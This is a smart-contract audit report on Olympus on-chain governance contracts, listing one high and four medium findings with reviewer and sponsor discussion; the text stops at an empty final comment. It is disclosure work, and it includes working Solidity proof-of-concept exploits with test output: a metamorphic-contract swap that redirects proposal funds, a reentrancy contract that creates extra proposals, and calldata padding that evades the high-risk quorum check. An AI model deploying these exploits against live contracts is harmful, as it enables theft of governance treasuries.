# Issue H-1: Proposals are vulnerable to metamorphic attacks 

Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/103 

## Found by 
Bobface, IllIllI
## Summary

Proposals are vulnerable to metamorphic attacks where `create2()`/`selfdestruct()` are used to completely re-write proposal actions right before execution


## Vulnerability Detail

The timelock does not ensure that the `code` at the address of the target of the timelock's transaction hasn't changed since being proposed.


## Impact

An attacker can completely rewrite the backing logic of a proposal's external calls, as was seen in the [tornado governance attack](https://forum.tornado.ws/t/full-governance-attack-description/62), or by creating a `create2()`'d contract with a `payable fallback()` at the destination of an Eth transfer of part of a proposal


## Code Snippet

The target's code is not included in what's hashed:
```solidity
// File: src/external/governance/Timelock.sol : Timelock.queueTransaction()   #1

118:           bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));
```
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/Timelock.sol#L108-L118

and target passed in to the execution function is not verified to have the same code as during the proposal:
```solidity
// File: src/external/governance/Timelock.sol : Timelock.executeTransaction()   #2

164            // solium-disable-next-line security/no-call-value
165:           (bool success, bytes memory returnData) = target.call{value: value}(callData);
```
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/Timelock.sol#L164-L165


## Tool used

Manual Review


## Recommendation

Include the target address' [code](https://github.com/coinspect/learn-evm-attacks/tree/master/test/Business_Logic/TornadoCash_Governance#possible-mitigations) in what's hashed



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**haxatron** commented:
> Invalid. Interesting, but this is not limited to metamorphic contracts but proxy contracts too and is therefore an inherent risk in all DAOs. In addition the Tornado hack involved delegatecall whereas Bravo implementation just makes an external call.



**0xLienid**

near impossible to fix the proxy contract case, but we will add a codehash check anyways to at least reduce the surface area

**nevillehuang**

Request poc

**sherlock-admin**

PoC requested from @IllIllI000

Requests remaining: **6**

**IllIllI000**

Please read through steps 1-5:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

// code modified from https://github.com/pcaversaccio/tornado-cash-exploit/blob/main/test/MetamorphicContract.t.sol

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

contract DistributeFundsEqually {

    function distributeFunds(address alice, uint256 aAmount, address bob, uint256 bAmount, address carol, uint256 cAmount) public payable {
        console.log("Sending funds to alice, bob, carol");
    }
    
    function cleanUp() public {
        selfdestruct(payable(address(0)));
    }
}

contract GiveAllFundsToAttacker {
    address private attacker;

    constructor(address a_) {
        attacker = a_;
    }
    
    function distributeFunds(address alice, uint256 aAmount, address bob, uint256 bAmount, address carol, uint256 cAmount) public payable {
        console.log("Sending _all_ funds to the attacker instead ", attacker);
    }
}

contract Factory {
    function helloA() public returns (address) {
        return address(new DistributeFundsEqually());
    }

    function helloB() public returns (address) {
        return address(new GiveAllFundsToAttacker(address(0x1337)));
    }

    function cleanUp() public {
        selfdestruct(payable(address(0)));
    }
}

contract MetamorphicContract is Test {
    DistributeFundsEqually private a;
    Factory private factory;

    function setUp() public {
        /** Step 1: deploy original contract that everyone will look at for the proposal. Nobody has to know about the factory, and it won't have verified source on etherscan **/
        factory = new Factory{salt: keccak256(abi.encode("random"))}();
        a = DistributeFundsEqually(factory.helloA());

        /** Step 2: create a proposal that will call a.distributeFunds(), with funds transferred from the OHM Kernel TRSRY module, to each of the listed recipients with the specified values **/
        // will use vm.deal() and a direct call, rather than doing the proposal setup stuff in this test
        
        /** Step 3: wait for the proposal to pass **/

        /** Step 4a: selfdestruct things to a new attacker contract can be created at the same address as the original DistributeFundsEqually contract **/
        /// @dev Call `selfdestruct` during the `setUp` call (see https://github.com/foundry-rs/foundry/issues/1543).
        a.cleanUp();
        factory.cleanUp();
    }

    function testMorphingContract() public {
        /// @dev Verify that the code was destroyed during the `setUp` call.
        assertEq(address(a).code.length, 0);
        assertEq(address(factory).code.length, 0);

        /** Step 4b: create the new GiveAllFundsToAttacker contract at the same address as the original DistributeFundsEqually contract **/
        /// @dev Redeploy the factory contract at the same address.
        factory = new Factory{salt: keccak256(abi.encode("random"))}();
        /// @dev Deploy another logic contract at the same address as previously contract `a`.
        GiveAllFundsToAttacker b = GiveAllFundsToAttacker(factory.helloB());
        assertEq(address(a), address(b));
        
        /** Step 5: execute() the proposal, seeing that all funds get sent to the attacker **/
        vm.deal(address(this), 99 ether);
        a.distributeFunds{value: 99}(address(0x0a), 33 ether, address(0x0b), 33 ether, address(0x0c), 33 ether);
    }
}
```
output:
```text
Running 1 test for src/test/Test.t.sol:MetamorphicContract
[PASS] testMorphingContract() (gas: 528012)
Logs:
  Sending _all_ funds to the attacker instead  0x0000000000000000000000000000000000001337

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.14ms
```

**nevillehuang**

@IllIllI000 Thanks, wow, just interested what is the fix to this issue? Wouldn't this be applicable to all governance protocols? Would be good to see some example on how certain governance protocols prevents this.

**IllIllI000**

The duplicate #56 points to MakerDAO as having [this](https://github.com/dapphub/ds-pause/blob/0763eafcf926fd2e073aee5f047f3decb842231c/src/pause.sol#L97) protection of checking the `extcodehash`

**nevillehuang**

@IllIllI000 Thanks, I believe this could possibly be even high severity if the target address is in the power of the proposer, or don't even have to be so, given the ability to front-run on mainnet.

**0xLienid**

Fix: https://github.com/OlympusDAO/bophades/pull/300

**nevillehuang**

Based on discussions here and comments by sponsor [here](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/89#issuecomment-1913682953), I believe this issue consitutes high severity. What do you think @Czar102? 

# Issue M-1: Nobody can cast for any proposal 

Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/37 

## Found by 
Bauer, Breeje, alexzoid, blutorque, cawfree, cocacola, emrekocak, fibonacci, hals, nobody2018, pontifex, s1ce
## Summary

[[castVote](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L369)](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L369)/[[castVoteWithReason](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L385)](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L385)/[[castVoteBySig](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L403)](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L403) are used to vote for the specified proposal. These functions internally call [[castVoteInternal](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L433-L437)](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L433-L437) to perform voting logic. However, `castVoteInternal` can never be executed successfully.

## Vulnerability Detail

```solidity
File: bophades\src\external\governance\GovernorBravoDelegate.sol
433:     function castVoteInternal(
434:         address voter,
435:         uint256 proposalId,
436:         uint8 support
437:     ) internal returns (uint256) {
......
444:         // Get the user's votes at the start of the proposal and at the time of voting. Take the minimum.
445:         uint256 originalVotes = gohm.getPriorVotes(voter, proposal.startBlock);
446:->       uint256 currentVotes = gohm.getPriorVotes(voter, block.number);
447:         uint256 votes = currentVotes > originalVotes ? originalVotes : currentVotes;
......
462:     }
```

The second parameter of `gohm.getPriorVotes(voter, block.number)` can only a number smaller than `block.number`. Please see the [[code](https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code#L703)](https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code#L703) deployed by gOHM on the mainnet:

```solidity
function getPriorVotes(address account, uint256 blockNumber) external view returns (uint256) {
->      require(blockNumber < block.number, "gOHM::getPriorVotes: not yet determined");
......
    }
```

Therefore, L446 will always revert. Voting will not be possible.

Copy the coded POC below to one project from Foundry and run `forge test -vvv` to prove this issue.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface CheatCodes {
    function prank(address) external;
    function createSelectFork(string calldata,uint256) external returns(uint256);
}

interface IGOHM {
    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint256);
}

contract ContractTest is DSTest{
    address gOHM = 0x0ab87046fBb341D058F17CBC4c1133F25a20a52f;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 19068280);
    }

    function testRevert() public {
        address user = address(0x12399543949349);
        cheats.prank(user);
        IGOHM(gOHM).getPriorVotes(address(0x1111111111), block.number);
    }

    function testOk() public {
        address user = address(0x12399543949349);
        cheats.prank(user);
        IGOHM(gOHM).getPriorVotes(address(0x1111111111), block.number - 1);
    }
}
/**output
[PASS] testOk() (gas: 13019)
[FAIL. Reason: revert: gOHM::getPriorVotes: not yet determined] testRevert() (gas: 10536)
Traces:
  [10536] ContractTest::testRevert()
    ├─ [0] VM::prank(0x0000000000000000000000000012399543949349)
    │   └─ ← ()
    ├─ [540] 0x0ab87046fBb341D058F17CBC4c1133F25a20a52f::getPriorVotes(0x0000000000000000000000000000001111111111, 19068280 [1.906e7]) [staticcall]  
    │   └─ ← revert: gOHM::getPriorVotes: not yet determined
    └─ ← revert: gOHM::getPriorVotes: not yet determined

Test result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 1.80s
**/
```

## Impact

Nobody can cast for any proposal. Not being able to vote means the entire governance contract will be useless. Core functionality is broken.

## Code Snippet

https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L446

## Tool used

Manual Review

## Recommendation

```fix
File: bophades\src\external\governance\GovernorBravoDelegate.sol
445:         uint256 originalVotes = gohm.getPriorVotes(voter, proposal.startBlock);
446:-        uint256 currentVotes = gohm.getPriorVotes(voter, block.number);
446:+        uint256 currentVotes = gohm.getPriorVotes(voter, block.number - 1);
447:         uint256 votes = currentVotes > originalVotes ? originalVotes : currentVotes;
```

&nbsp;



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**haxatron** commented:
> Medium. It would be caught immediately on deployment and implementation is upgradeable. There can be no loss of funds which is requisite of a high.



**IllIllI000**

Agree with haxatron that this is Medium, not High, based on Sherlock's rules

**nevillehuang**

Can agree, since this is purely a DoS, no malicious actions can be performed since no voting can be done anyways. 

@Czar102 I am interested in hearing your opinion, but I will set medium for now, because governance protocols fund loss impact is not obvious but I initially rated it high because it quite literally breaks the whole protocol. I believe sherlock needs to cater to different types of protocols and not only associate rules to defi/financial losses (example protocols include: governance, on chain social media protocols etc..)

**0xLienid**

Fix: https://github.com/OlympusDAO/bophades/pull/293

# Issue M-2: Proposer can create high number of proposals through reentrancy 

Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/62 

## Found by 
r0ck3tz, s1ce
## Summary

The reentrancy through the [`_isHighRiskProposal`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L611-L670) function of the GovernorBravoDelegate contract allows the creation of a high number of proposals by the same proposer.

## Vulnerability Detail

The [`propose`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L127-L205) function of `GovernorBravoDelegate` contract [ensures that the proposer can create only one proposal](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L147-L154) that is either pending or active.

```solidity
uint256 latestProposalId = latestProposalIds[msg.sender];
if (latestProposalId != 0) {
    ProposalState proposersLatestProposalState = state(latestProposalId);
    if (proposersLatestProposalState == ProposalState.Active)
         revert GovernorBravo_Proposal_AlreadyActive();
    if (proposersLatestProposalState == ProposalState.Pending)
         revert GovernorBravo_Proposal_AlreadyPending();
}
``` 

Once the proposal is created, the value in the [`latestProposalIds`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L190) mapping is updated. The issue is that before this update, the [`_isHighRiskProposal`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L169) function is executed, allowing reentrancy through a call to [`configureDependencies`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L655-L656) of the provided target address. This can be exploited by an attacker who creates a proposal that reenters the `propose` function before the `latestProposalIds` mapping is updated, thereby creating additional proposals

The following proof of concept demonstrates the creation of 12 proposals by a single proposer:

`ReentrancyExploit` contract:
```solidity
contract ReentrancyExploit {
    using Address for address;

    GovernorBravoDelegator governorBravoDelegator;
    Kernel kernel;
    
    uint256 depth = 0;

    function attack(GovernorBravoDelegator _governorBravoDelegator, Kernel _kernel) external {
        governorBravoDelegator = _governorBravoDelegator;
        kernel = _kernel;
        
        // Proposal 1
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        string memory description = "Proposal 1";
        
        targets[0] = address(kernel);
        values[0] = 0;
        signatures[0] = "";
        calldatas[0] = abi.encodeWithSelector(
            kernel.executeAction.selector,
            Actions.ActivatePolicy,
            address(this)
        );
    
        bytes memory data = address(governorBravoDelegator).functionCall(
            abi.encodeWithSignature(
                "propose(address[],uint256[],string[],bytes[],string)",
                targets,
                values,
                signatures,
                calldatas,
                description
            )
        );

        uint256 proposalId = abi.decode(data, (uint256));
        console2.log("created proposal", proposalId);
    }

    function configureDependencies() external returns (Keycode[] memory dependencies) {
        console2.log("reentrancy");

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        string memory description = "Proposal 2";
        
        targets[0] = address(kernel);
        values[0] = 0;
        signatures[0] = "";
        calldatas[0] = "";
        if(depth++ < 10) {
            calldatas[0] = abi.encodeWithSelector(
                kernel.executeAction.selector,
                Actions.ActivatePolicy,
                address(this)
            );
        }

        bytes memory data = address(governorBravoDelegator).functionCall(
            abi.encodeWithSignature(
                "propose(address[],uint256[],string[],bytes[],string)",
                targets,
                values,
                signatures,
                calldatas,
                description
            )
        );
        uint256 proposalId = abi.decode(data, (uint256));
        console2.log("created proposal", proposalId);
    }
}
```

Foundry test case:
```solidity
function testExploit2() public {
    ReentrancyExploit exploit = new ReentrancyExploit();
    
    vm.prank(alice);
    gohm.transfer(address(exploit), 110_000e18);
    gohm.checkpointVotes(address(exploit));

    exploit.attack(governorBravoDelegator, kernel);
}
```

Results:
```shell
[PASS] testExploit2() (gas: 5162466)
Logs:
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  created proposal 12
  created proposal 11
  created proposal 10
  created proposal 9
  created proposal 8
  created proposal 7
  created proposal 6
  created proposal 5
  created proposal 4
  created proposal 3
  created proposal 2
  created proposal 1

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.72ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

As a proposer, the attacker can bypass the limit of one active/pending proposal and create multiple proposals.

## Code Snippet

- https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L655-L656
- https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L190

## Tool used

Manual Review

## Recommendation

It is recommended to follow the checks-effects-interactions pattern and update the `latestProposalIds` mapping before executing the `_isHighRiskProposal` function.



## Discussion

**IllIllI000**

I believe this is a low, because creating extra proposals does not cause any loss of funds/impact the functioning of the contract

**0xLienid**

We will still fix this though as it does throw a wrench in intended use

**nevillehuang**

@IllIllI000 I think this should remain medium severity:

- The invariant of one active proposal per proposer is bypassed
- This can be abused by any proposer to bypass proposal thresholds just by having sufficient balance in once instance and then cascade by transferring gOHM as well as be combined with other attack paths like in #103 and #100
- Given there is a veto mechanism in place, if this is invalid, why should’t #104 and #100 be invalid too?

**IllIllI000**

In the case of #104, I've shown that a completely valid proposal can be maliciously changed to be an attacker-controlled one. In the case of this bug, there is no change (that any of the submitters has pointed to) of the proposal being executed, so it would be apparent that the proposal is to queue other proposals, and would never pass. You're giving the submitters benefit of the doubt that they would have been able to chain multiple low attacks to create a medium, but none of them has actually done this, so I believe the rule is the findings have to stand on their own. The invariant argument seems like the only relevant one to me, but since there's no loss of funds and the contract isn't broken, it's hard to say that it would rise to be a medium: `Breaks core contract functionality, rendering the contract useless (should not be easily replaced without loss of funds) or leading to unknown potential exploits/loss of funds. Ex: Unable to remove malicious user/collateral from the contract` https://docs.sherlock.xyz/audits/judging/judging#v.-how-to-identify-a-medium-issue

**nevillehuang**

@IllIllI000 Isn't #100 also talking about only an invariant too? I mean sure you can say it bypasses the high risk check but isn't it still subjected to being vetoed? Or are you implying there that there is a possibility all of this can be bypassed without being noticed?

@Czar102 what do you think? I think I can agree with @IllIllI000.

**IllIllI000**

For #100, the high-risk invariant is meant to protect against proposals taking funds with fewer votes than expected. It's essentially a weak _isAdmin_ check on distributing treasury funds, which is being bypassed. For this current issue, the only thing being bypassed is a check against a counter, and some other vulnerability would have to exist in order to lose funds.

**nevillehuang**

@IllIllI000 I understand the importance of the high risk check, given it was explicitly mentioned in the contest details, but I can also see how both this and the other issue is alluding to bypassing checks, and both can be mitigated by a vetoing mechanism.

I definitely am sure that #100 is a valid medium severity, but this one I will listen to @Czar102 comments first before making a final decision.

**0xLienid**

Fix: https://github.com/OlympusDAO/bophades/pull/296

**nevillehuang**

@IllIllI000 I will maintain as medium severity. While this is not an invariant explicitly mentioned in the docs, I believe it breaks the invariant of one active proposal per proposer **easily** with minimal external conditions (and is quite obviously implied by the check), forcing the usage of the veto mechanism. This would constitute "breaking" intended functionality for me + sponsor agrees with me, so I will leave it up to you and other watsons to escalate or not during escalation period.

# Issue M-3: High risk checks can be bypassed with extra `calldata` padding 

Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/100 

## Found by 
IllIllI, Kow, cawfree, fibonacci, haxatron, r0ck3tz
## Summary

Adding extra unused bytes to proposal calldata can trick the `_isHighRiskProposal()` function


## Vulnerability Detail

The length checks on the transaction calldata of what falls into the 'high risk' proposal category is too strict, and incorrectly fails with extra padding. In solidity, any extra bytes of `calldata`, beyond what is required to satisfy the function arguments, are ignored, and have no effect on the operation of the function being called.


## Impact

A proposal that should have been flagged as high risk, is not, and therefore can be passed with the easier, lower, quorum. This violates a critical [invariant](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/tree/main/bophades/audit/2024-01_governance#proposal-quorum-threshold).


## Code Snippet

Checks for calls to the kernel's `executeAction()` function, expect exactly the right number of bytes to satisfy the function arguments, and no more:
```solidity
// File: src/external/governance/GovernorBravoDelegate.sol : GovernorBravoDelegate._isHighRiskProposal()   #1

631                    // Check if the action is making a core change to system via the kernel
632                    if (selector == Kernel.executeAction.selector) {
633                        uint8 action;
634                        address actionTarget;
635    
636 @>                     if (bytes(signature).length == 0 && data.length == 0x44) {
637                            assembly {
638                                action := mload(add(data, 0x24)) // accounting for length and selector in first 4 bytes
639                                actionTarget := mload(add(data, 0x44))
640                            }
641 @>                     } else if (data.length == 0x40) {
642                            (action, actionTarget) = abi.decode(data, (uint8, address));
643                        } else {
644                            continue;
645:                       }
```
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L631-L645

this results in an easier quorum threshold:
```solidity
// File: src/external/governance/GovernorBravoDelegate.sol : GovernorBravoDelegate.propose()   #2

168                // Identify the quorum level to use
169 @>             if (_isHighRiskProposal(targets, signatures, calldatas)) {
170                    quorumVotes = getHighRiskQuorumVotes();
171                } else {
172 @>                 quorumVotes = getQuorumVotes();
173:               }
```
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L168-L173


## Tool used

Manual Review


## Recommendation

Change length checks to be `>=`, rather than strict equality, since the function signature already specifies the number of arguments


## PoC

The following test shows that extending the calldata by an empty byte still triggers a valid call to `executeAction()`, but is categorized as lower severity:
```diff
diff --git a/bophades/src/test/external/GovernorBravoDelegate.t.sol b/bophades/src/test/external/GovernorBravoDelegate.t.sol
index 778163c..bdb6ae2 100644
--- a/bophades/src/test/external/GovernorBravoDelegate.t.sol
+++ b/bophades/src/test/external/GovernorBravoDelegate.t.sol
@@ -386,6 +386,10 @@ contract GovernorBravoDelegateTest is Test {
         assertEq(quorum, 200_000e18);
     }
 
+    function executeAction(Actions action_, address target_) external {
+        console2.log("executed with extra calldata");
+    }
+
     function testCorrectness_proposeCapturesCorrectQuorum_highRisk() public {
         // Activate TRSRY
         vm.prank(address(timelock));
@@ -404,9 +408,12 @@ contract GovernorBravoDelegateTest is Test {
         calldatas[0] = abi.encodeWithSelector(
             kernel.executeAction.selector,
             Actions.ActivatePolicy,
-            address(custodian)
+            address(custodian),
+            ""
         );
 
+        address(this).call(calldatas[0]);
+
         vm.prank(alice);
         bytes memory data = address(governorBravoDelegator).functionCall(
             abi.encodeWithSignature(
```

Output:
```text
% forge test --match-test testCorrectness_proposeCapturesCorrectQuorum_highRisk -vv
...
[FAIL. Reason: assertion failed] testCorrectness_proposeCapturesCorrectQuorum_highRisk() (gas: 568208)
Logs:
  executed with extra calldata
  Error: a == b not satisfied [uint]
    Expected: 300000000000000000000000
      Actual: 200000000000000000000000

Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 14.92ms
...
```



## Discussion

**0xLienid**

Valid, will fix by reverting if the calldata doesn't match the right size since we know what the size must be for an `executeAction` call

**0xLienid**

Fix: https://github.com/OlympusDAO/bophades/pull/299

# Issue M-4: Post-proposal vote quorum/threshold checks use a stale total supply value 

Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/102 

## Found by 
IllIllI, hals
## Summary

The pessimistic vote casting [approach](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/tree/main/bophades/audit/2024-01_governance#vote-casting) stores its cutoffs based on the total supply during proposal creation, rather than looking up the current value for each check.


## Vulnerability Detail

`gOHM token holders can delegate their voting rights either to themselves or to an address of their choice. Due to the elasticity in the gOHM supply, and unlike the original implementation of Governor Bravo, the Olympus governance system relies on dynamic thresholds based on the total gOHM supply. This mechanism sets specific thresholds for each proposal, based on the current supply at that time, ensuring that the requirements (in absolute gOHM terms) for proposing and executing proposals scale with the token supply.`
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/tree/main/bophades/audit/2024-01_governance#olympus-governor-bravo-implementation

The above means that over time, due to dynamic minting and burning, the total supply will be different at different times, whereas the thresholds/quorums checked against are solely the ones set during proposal creation.


## Impact

DoS of the voting system, preventing proposals from ever passing, under certain circumstances

Consider the case of a bug where there is some sort of runaway death spiral bug or attack in the dymamic burning of gOHM (e.g. opposite of Terra/Luna), and the only fix is to pass a proposal to disable the module(s) causing a problem where everyone is periodically having their tokens [`burn()`-from-ed](https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code#L654). At proposal creation there are sufficient votes to pass the threshold, but after the minimum [3-day](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L25-L31) waiting period, the total supply has been halved, and the original proposer no longer has a sufficient quorum to execute the proposal (or some malicious user decides to cancel it, and there is no user for which `isWhitelisted()` returns true). No proposal can fix the issue, since no proposal will have enough votes to pass, by the time it's time to vote. Finally, once the total supply reaches low wei amounts, the treasury can be stolen by any remaining holders, due to loss of precision:

* `getProposalThresholdVotes()`: min threshold is 1_000, so if supply is <100, don't need any votes to pass anything
* `getQuorumVotes()`: quorum percent is hard-coded to 20_000 (20%), so if supply drops below 5, quorum is zero
* `getHighRiskQuorumVotes()`: high percent is hard-coded to 30_000 (30%), so if supply drops below 4, quorum is zero for high risk


## Code Snippet

The quorum comes from the total supply...
```solidity
// File: src/external/governance/GovernorBravoDelegate.sol : GovernorBravoDelegate.getHighRiskQuorumVotes()   #1

698        function getQuorumVotes() public view returns (uint256) {
699            return (gohm.totalSupply() * quorumPct) / 100_000;
700        }
...
706        function getHighRiskQuorumVotes() public view returns (uint256) {
707            return (gohm.totalSupply() * highRiskQuorum) / 100_000;
708:       }
```
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L696-L708

...and is set during [`propose()`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L169-L182), and checked as-is against the eventual vote:
```solidity
// File: src/external/governance/GovernorBravoDelegate.sol : GovernorBravoDelegate.getVoteOutcome()   #2

804            } else if (
805                (proposal.forVotes * 100_000) / (proposal.forVotes + proposal.againstVotes) <
806 @>             approvalThresholdPct ||
807 @>             proposal.forVotes < proposal.quorumVotes
808            ) {
809                return false;
810:           }
```
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L804-L810

## Tool used

Manual Review


## Recommendation

Always calculate the quorum and thresholds based on the current `gohm.totalSupply()` as is done in the OZ [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a5c4cd8182103aa96c2147433bf1bfb8fde63ca9/contracts/governance/extensions/GovernorVotesQuorumFraction.sol#L69-L74), and consider making votes based on the fraction of total supply held, rather than a raw amount, since vote tallies are affected too




## Discussion

**0xLienid**

If votes are locked in at a maximum of the value a voter had at the time the proposal started I don't think it makes sense to use the current `totalSupply` at proposal queueing to determine success/meeting quorum. you want it to be a comparable value to the votes values, hence lock it in at proposal creation

**IllIllI000**

Since the votes are locked in at the proposal start, then shouldn't the quorum be based on the total supply at that starting block, in order to have a comparable value? Right now the code is consistent with the proposal time only, which may have a vastly different total supply. Shouldn't the code always be consistent with total supply of whichever block is being checked? The votes would still be at the time of the start of voting, but when determining whether a proposal should be queueable/executable/cancelable, if everyone's token counts and the total supply has be halved, there has been no change in who logically would be best positioned to vote, but since the code compares against a stored raw value rather than a ratio, the proposal can fail through no fault of the proposer. They would be able to propose a new vote but be unable to use their old proposal, even though the ownership percentage is the same as before.

**nevillehuang**

@0xLienid I think @IllIllI000 highlights a valid scenario where this can cause a significant issue, and makes a good point as to why OZ implements quorums and thresholds computation that way.

However, I can also see how this is speculating on emergency situations etc.., but I think in the context of a governance, it is reasonable given it is where sensitive actions are performed. @Czar102 What do you think of this?

**0xLienid**

I just don't agree that you want the quorum to be subject to deviations in supply during the voting period. It allows user manipulation of the ease/difficulty required to pass a proposal.

> shouldn't the quorum be based on the total supply at that starting block, in order to have a comparable value?

yes, but that's impossible with gOHM

Frankly, I feel like if there is a critical bug in the core voting token then it's pretty expected that the governance system is also broken. 

The only tenable option I guess is getting rid of the pessimistic voting.

**0xLienid**

@nevillehuang @IllIllI000 Do you guys have additional thoughts on this? I'm trying to think about how severe it actually is, and if there's any path to fixing it other than using the live total supply which feels more or less similar to using votes not pinned to a block which is bad.

**IllIllI000**

@0xLienid When you say it's impossible with gOHM, I believe you mean that once the starting block has passed, that there's no way to get the total supply from that prior block. If that's what you meant, in order to get the total supply at the starting block, you could require that the proposal creator actually trigger the start of voting (within some grace period) with another transaction at some point after the projected start block based on the delay, and have that operation update the stored quorums and start block at that point, assuming that the old quorums are still valid. In reality, the proposer controls the block during which the start occurs anyway, since the proposal block is under their control, and the delay is known.

As for the remainder of the issue, I'm not familiar with all that is planned, but I don't think it would have to be a bug in the core voting token itself - it could be a kernel module that has a role that allows it to mint/burn gOHM, given some algorithm with a time delay. Once things are decentralized, it's difficult to be able to predict that that won't happen. You could create a new gOHM that checkpoints the prior total supply, and migrate the old token, but yeah, that would be a big change, and would likely require larger changes than can be done for this contest.

**nevillehuang**

Actually @IllIllI000 will there even ever be a situation where gOHM would be burned to literal 100, 5 and 4 given gOHM holds 18 decimals? I think on second look this is low severity, given the protocol can easily just implement a sanity check where they block any proposals creation/execution/queue and allow cancellation once totalSupply reaches this extreme small values.

I'm guessing your issue also points to the possible decrease in absolute quorums not just solely small amounts, but I think that example is not realistic and representative enough. Or am I missing a possible scenario where gOHM supply can reach literal small weis of value?

@0xLienid maybe a possible fix would be to make quorum percentages adjustable? This could open to front-running attacks though so I'll have to think through it more.

**IllIllI000**

@nevillehuang the 100/5/4 scenario is the end point after which everything can get stolen. Prior to that, this bug outlines that they can't stop an ongoing attack because creating a proposal to do so would never pass quorums due to the bug. This bug essentially was an elaboration of the issue described in the duplicate #74, to show that it's an issue with the underlying mechanics, rather than a one-time total supply discrepancy

**nevillehuang**

@IllIllI000 Yup that is my initial thoughts as well, sorry that I got confused by that scenario. I will likely maintain this issue as medium severity, and facilitate discussions between us and sponsor for a potential fix, since it seems to be non trivial.

**0xLienid**

Ok @IllIllI000 @nevillehuang just talked with the other devs for a bit and here's what we came up with.

1. Separate out proposal activation to another function so we can snapshot total supply more accurately
2. Set a minimum total supply such that proposing/queuing/executing ends up in the hands of an admin (and block the standard behavior for end users) if we fall below that. If you think about a burn bug of this magnitude it's a critical implosion of the protocol and so it makes sense to not rely on full on chain governance

Thoughts?

**IllIllI000**

